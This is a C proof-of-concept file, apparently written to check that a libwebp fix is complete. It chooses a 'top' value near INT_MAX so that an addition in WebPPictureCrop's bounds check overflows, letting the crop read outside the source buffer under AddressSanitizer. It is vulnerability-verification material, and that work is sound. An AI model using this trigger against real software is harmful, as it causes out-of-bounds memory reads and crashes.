// Residual-defect PoC for AdjustAndCheckRectangle() integer overflow.
//
// WebPPictureCrop() is the project's public encode.h API for cropping a
// WebPPicture. It is expected to reject any (left, top, width, height)
// rectangle that does not fit within the source picture. A sufficiently
// large 'top' makes (*top) + height wrap around INT_MAX, so the bounds
// check wrongly accepts an out-of-picture rectangle, and the subsequent
// crop reads far outside the source buffer.
//
// Build (ASan):
//   cc -fsanitize=address -g -O0 -I/work -I/work/src residual.c \
//      /tmp/build/libwebp.a -o residual
// Run:
//   ./residual

#include <stdio.h>
#include <stdlib.h>

#include "webp/encode.h"

int main(void) {
  WebPPicture pic;
  WebPPicture view;
  const int width = 16;
  const int height = 16;
  uint8_t* rgba;
  int i;

  if (!WebPPictureInit(&pic)) {
    fprintf(stderr, "WebPPictureInit failed\n");
    return 1;
  }
  pic.use_argb = 1;
  pic.width = width;
  pic.height = height;

  rgba = (uint8_t*)malloc((size_t)width * height * 4);
  for (i = 0; i < width * height * 4; i++) rgba[i] = (uint8_t)i;

  if (!WebPPictureImportRGBA(&pic, rgba, width * 4)) {
    fprintf(stderr, "WebPPictureImportRGBA failed\n");
    free(rgba);
    return 1;
  }
  free(rgba);

  if (!WebPPictureInit(&view)) {
    fprintf(stderr, "WebPPictureInit failed\n");
    WebPPictureFree(&pic);
    return 1;
  }

  // A crafted, in-contract crop request: left/width are within bounds
  // (so the fixed left/width check passes), but 'top' is chosen so that
  // top + height overflows a 32-bit signed int and wraps to a negative
  // value, defeating the (still addition-based) top/height bounds check.
  {
    const int left = 0;
    const int crop_width = 4;
    const int crop_height = 4;
    const int top = 2147483645;  // INT_MAX - 2

    if (WebPPictureCrop(&pic, left, top, crop_width, crop_height)) {
      fprintf(stderr, "crop unexpectedly accepted bounds-exceeding rectangle "
                       "and ran to completion\n");
    } else {
      fprintf(stderr, "crop correctly rejected the rectangle\n");
    }
  }

  WebPPictureFree(&pic);
  return 0;
}
